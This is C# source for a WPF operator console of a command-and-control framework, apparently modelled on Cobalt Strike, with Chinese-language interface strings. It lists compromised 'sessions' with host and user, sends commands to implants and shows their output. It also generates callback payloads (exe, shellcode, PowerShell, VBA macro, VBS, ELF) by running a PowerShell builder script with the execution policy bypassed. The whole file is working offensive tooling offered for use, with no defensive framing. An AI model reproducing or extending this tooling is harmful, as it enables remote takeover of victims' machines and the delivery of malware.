using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Threading;

namespace CsdevGui
{
    public partial class MainWindow : Window
    {
        private readonly HttpClient _http = new HttpClient { Timeout = TimeSpan.FromSeconds(6) };
        private readonly DispatcherTimer _timer = new DispatcherTimer();
        private readonly DispatcherTimer _clock = new DispatcherTimer();
        private readonly List<string> _hist = new List<string>();
        private int _histIdx = -1;

        private string _baseUrl = "http://127.0.0.1:8443";
        private bool _connected = false;
        private string _curSid = null;
        private long _since = 0;
        private string _sessionKeyLast = "";
        private readonly string _devRoot;

        public MainWindow()
        {
            InitializeComponent();

            // 定位开发根目录 (csdev): 本 exe 在 <dev>/gui/bin/... 下
            string dir = AppDomain.CurrentDomain.BaseDirectory;
            for (int i = 0; i < 6 && dir != null; i++)
            {
                var probe = Path.Combine(dir, "tools", "gen_payload.ps1");
                if (File.Exists(probe)) { _devRoot = dir; break; }
                var parent = Path.GetDirectoryName(dir.TrimEnd('\\'));
                if (parent == dir) break;
                dir = parent;
            }
            if (_devRoot == null)
                _devRoot = @"D:\cobalt_strike_4.7\cs_dev";

            OutBox.Text = Path.Combine(_devRoot, "build", "payload", "payload.exe");

            _timer.Interval = TimeSpan.FromSeconds(2);
            _timer.Tick += (s, e) => PollTick();
            _timer.Start();

            _clock.Interval = TimeSpan.FromSeconds(1);
            _clock.Tick += (s, e) => ClockText.Text = DateTime.Now.ToString("HH:mm:ss");
            _clock.Start();

            Log("csdev C2 控制台就绪");
            Log("开发目录: " + _devRoot);
            Log("");
            Log("请先启动服务端:");
            Log("  csdev-server.exe --port 8443");
            Log("");
            Log("然后在 [服务端] 标签页点『连接』");
        }

        // ---------------------------------------------------------- 工具
        private void Log(string msg)
        {
            Terminal.Text += (Terminal.Text.Length > 0 ? "\n" : "") + msg;
            TermScroll.ScrollToEnd();
        }

        private void LogGen(string msg)
        {
            GenLog.Text += (GenLog.Text.Length > 0 && !GenLog.Text.EndsWith("就绪") ? "\n" : "") + msg;
            if (GenLog.Text.StartsWith("就绪")) GenLog.Text = msg;
        }

        private void SetStatus(string s) => StatusBar.Text = s;

        private void SetConn(bool ok)
        {
            _connected = ok;
            StatusDot.Fill = ok ? (Brush)FindResource("Ok") : (Brush)FindResource("Err");
            StatusText.Text = ok ? "已连接" : "未连接";
        }

        // 双编码解码: 服务端文本是 UTF-8, 植入体输出是 GBK
        private static string DecodeB64(string b64)
        {
            try
            {
                byte[] b = Convert.FromBase64String(b64);
                try
                {
                    var strict = new UTF8Encoding(false, true);
                    return strict.GetString(b);
                }
                catch
                {
                    return Encoding.GetEncoding(936).GetString(b);
                }
            }
            catch { return b64; }
        }

        // ---------------------------------------------------------- 轮询
        private async void PollTick()
        {
            if (!_connected) return;

            try
            {
                var r = await _http.GetStringAsync(_baseUrl + "/api/sessions");
                using var doc = JsonDocument.Parse(r);
                var root = doc.RootElement;
                var arr = root.GetProperty("sessions");

                SessionCount.Text = "会话 " + arr.GetArrayLength();

                string sel = _curSid;
                SessionList.Items.Clear();

                foreach (var s in arr.EnumerateArray())
                {
                    string sid = s.GetProperty("sid").GetString();
                    string host = s.GetProperty("host").GetString();
                    string user = s.GetProperty("user").GetString();
                    string arch = s.GetProperty("arch").GetString();
                    long idle = s.GetProperty("idle").GetInt64();

                    var sp = new StackPanel();
                    var h = new StackPanel { Orientation = Orientation.Horizontal };
                    h.Children.Add(new System.Windows.Shapes.Ellipse
                    {
                        Width = 7, Height = 7,
                        Fill = (Brush)FindResource("Ok"),
                        VerticalAlignment = VerticalAlignment.Center,
                        Margin = new Thickness(0, 0, 8, 0)
                    });
                    h.Children.Add(new TextBlock
                    {
                        Text = host, FontWeight = FontWeights.SemiBold, FontSize = 13
                    });
                    sp.Children.Add(h);

                    sp.Children.Add(new TextBlock
                    {
                        Text = user + "@" + host,
                        FontFamily = new FontFamily("Consolas"),
                        FontSize = 11,
                        Foreground = (Brush)FindResource("Dim"),
                        Margin = new Thickness(15, 3, 0, 0)
                    });

                    var rrow = new StackPanel
                    {
                        Orientation = Orientation.Horizontal,
                        Margin = new Thickness(15, 6, 0, 0)
                    };
                    foreach (var tag in new[] { sid, arch, idle + "s" })
                    {
                        rrow.Children.Add(new Border
                        {
                            Background = (Brush)FindResource("Bg"),
                            CornerRadius = new CornerRadius(3),
                            Padding = new Thickness(6, 1, 6, 1),
                            Margin = new Thickness(0, 0, 6, 0),
                            Child = new TextBlock
                            {
                                Text = tag,
                                FontFamily = new FontFamily("Consolas"),
                                FontSize = 10,
                                Foreground = (Brush)FindResource("Accent")
                            }
                        });
                    }
                    sp.Children.Add(rrow);

                    var item = new ListBoxItem { Content = sp, Tag = sid };
                    SessionList.Items.Add(item);
                    if (sid == sel) SessionList.SelectedItem = item;
                }

                if (sel != null) await PollOutput();
            }
            catch (Exception ex)
            {
                SetConn(false);
                SetStatus("服务端连接失败: " + ex.Message);
            }
        }

        private async Task PollOutput()
        {
            if (_curSid == null) return;
            try
            {
                string url = string.Format("{0}/api/output?sid={1}&since={2}", _baseUrl, _curSid, _since);
                var r = await _http.GetStringAsync(url);
                using var doc = JsonDocument.Parse(r);
                var root = doc.RootElement;
                if (!root.GetProperty("ok").GetBoolean()) return;
                var items = root.GetProperty("items");

                foreach (var it in items.EnumerateArray())
                {
                    long ts = it.GetProperty("ts").GetInt64();
                    if (ts > _since) _since = ts;
                    string txt = DecodeB64(it.GetProperty("text").GetString());
                    txt = txt.Replace("\r", "");
                    if (txt.StartsWith("> ")) { Log(txt.Replace("> ", "➜ ")); continue; }
                    Log(txt.TrimEnd('\n'));
                }
            }
            catch { }
        }

        // ---------------------------------------------------------- 交互
        private void SessionList_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            var item = SessionList.SelectedItem as ListBoxItem;
            if (item == null) return;
            string sid = item.Tag as string;
            if (sid == _curSid) return;
            _curSid = sid;
            _since = 0;
            Terminal.Text = "";
            Log("已选择会话 " + sid);
            SetStatus("当前会话: " + sid);
        }

        private void CmdInput_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter) { Send_Click(sender, null); e.Handled = true; }
            else if (e.Key == Key.Up)
            {
                if (_hist.Count > 0 && _histIdx > 0) { _histIdx--; CmdInput.Text = _hist[_histIdx]; CmdInput.CaretIndex = CmdInput.Text.Length; }
                e.Handled = true;
            }
            else if (e.Key == Key.Down)
            {
                if (_histIdx < _hist.Count - 1) { _histIdx++; CmdInput.Text = _hist[_histIdx]; }
                else { _histIdx = _hist.Count; CmdInput.Text = ""; }
                e.Handled = true;
            }
        }

        private async void Send_Click(object sender, RoutedEventArgs e)
        {
            string cmd = CmdInput.Text.Trim();
            if (cmd.Length == 0) return;
            if (_curSid == null) { SetStatus("请先选择一个会话"); return; }

            CmdInput.Text = "";
            _hist.Add(cmd); _histIdx = _hist.Count;
            Log("➜ " + cmd);

            try
            {
                var body = JsonSerializer.Serialize(new { sid = _curSid, cmd });
                var content = new StringContent(body, Encoding.UTF8, "application/json");
                await _http.PostAsync(_baseUrl + "/api/command", content);
            }
            catch (Exception ex) { Log("[!] 下发失败: " + ex.Message); }
        }

        private void Connect_Click(object sender, RoutedEventArgs e)
        {
            _baseUrl = ServerBox.Text.Trim().TrimEnd('/');
            SetConn(true);
            SetStatus("正在连接 " + _baseUrl);
            Log("尝试连接服务端: " + _baseUrl);
            PollTick();
        }

        private void Disconnect_Click(object sender, RoutedEventArgs e)
        {
            SetConn(false);
            SessionList.Items.Clear();
            SessionCount.Text = "会话 0";
            SetStatus("已断开");
        }

        // ---------------------------------------------------------- 生成器
        private string SelectedFormat()
        {
            var s = (FmtBox.SelectedItem as ComboBoxItem)?.Content as string ?? "win-exe";
            return s.Split(new[] { ' ', '\t' }, StringSplitOptions.RemoveEmptyEntries)[0];
        }

        private async void Generate_Click(object sender, RoutedEventArgs e)
        {
            string fmt = SelectedFormat();
            string host = HostBox.Text.Trim();
            string port = PortBox.Text.Trim();
            string outPath = OutBox.Text.Trim();

            if (host.Length == 0)
            {
                MessageBox.Show("请填写 C2 地址", "csdev", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }
            if (outPath.Length == 0)
            {
                outPath = Path.Combine(_devRoot, "build", "payload", "payload.exe");
                OutBox.Text = outPath;
            }

            // 按格式自动补扩展名
            string ext = ".exe";
            if (fmt == "win-raw") ext = ".bin";
            else if (fmt == "win-ps1") ext = ".ps1";
            else if (fmt == "win-vba") ext = ".bas";
            else if (fmt == "win-vbs") ext = ".vbs";
            else if (fmt.StartsWith("linux")) ext = ".elf";
            outPath = Path.ChangeExtension(outPath, ext);
            OutBox.Text = outPath;

            string script = Path.Combine(_devRoot, "tools", "gen_payload.ps1");
            if (!File.Exists(script))
            {
                MessageBox.Show("生成器脚本缺失:\n" + script, "csdev", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            GenLog.Text = "";
            LogGen("格式: " + fmt);
            LogGen("回连: " + host + ":" + port);
            LogGen("输出: " + outPath);
            LogGen("");
            SetStatus("正在编译 " + fmt + " ...");

            var psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = string.Format(
                    "-NoProfile -ExecutionPolicy Bypass -File \"{0}\" -Format {1} -Host_ \"{2}\" -Port {3} -OutFile \"{4}\"{5}",
                    script, fmt, host, port, outPath, SslBox.IsChecked == true ? " -Ssl" : ""),
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                StandardOutputEncoding = Encoding.UTF8
            };

            try
            {
                var p = Process.Start(psi);
                string outp = await p.StandardOutput.ReadToEndAsync();
                string errp = await p.StandardError.ReadToEndAsync();
                await Task.Run(() => p.WaitForExit());

                foreach (var line in outp.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries))
                    if (line.Trim().Length > 0) LogGen(line.TrimEnd());
                if (!string.IsNullOrWhiteSpace(errp)) LogGen("[stderr] " + errp.Trim());

                if (File.Exists(outPath))
                {
                    var fi = new FileInfo(outPath);
                    LogGen("");
                    LogGen("✔ 生成成功  " + (fi.Length / 1024) + " KB");
                    SetStatus("生成完成: " + outPath);
                }
                else
                {
                    LogGen("✘ 未产生输出文件");
                    SetStatus("生成失败");
                }
            }
            catch (Exception ex)
            {
                LogGen("[!] " + ex.Message);
                SetStatus("生成异常");
            }
        }

        private async void ListFormats_Click(object sender, RoutedEventArgs e)
        {
            string script = Path.Combine(_devRoot, "tools", "gen_payload.ps1");
            if (!File.Exists(script)) { LogGen("脚本缺失: " + script); return; }
            GenLog.Text = "";
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = "-NoProfile -ExecutionPolicy Bypass -File \"" + script + "\" -List",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.UTF8
                };
                var p = Process.Start(psi);
                string o = await p.StandardOutput.ReadToEndAsync();
                foreach (var line in o.Split('\n')) LogGen(line.TrimEnd('\r'));
            }
            catch (Exception ex) { LogGen("[!] " + ex.Message); }
        }
    }
}
